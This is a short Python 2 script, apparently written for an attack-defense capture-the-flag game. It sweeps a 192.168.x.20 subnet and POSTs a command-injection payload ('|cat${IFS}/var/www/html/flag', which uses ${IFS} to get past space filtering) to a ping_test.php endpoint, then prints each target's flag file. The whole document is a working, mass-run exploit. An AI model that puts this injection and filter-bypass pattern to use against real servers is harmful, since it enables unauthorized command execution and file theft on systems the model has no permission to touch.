#coding=utf-8
import requests
import re
url_head="http://192.168."	#网段
url=""
command_addr="/core/app/ping_test.php" #路径
port="80"
payload={'des':'|cat${IFS}/var/www/html/flag'}
for i in range(0,10):
	url=url_head+str(i)+".20:"+port+command_addr
	try:
		rex=requests.post(url,payload,timeout=1)
		result=url+" command sucess,flag is "+rex.text
		print result
	except:
		print url+" command fail"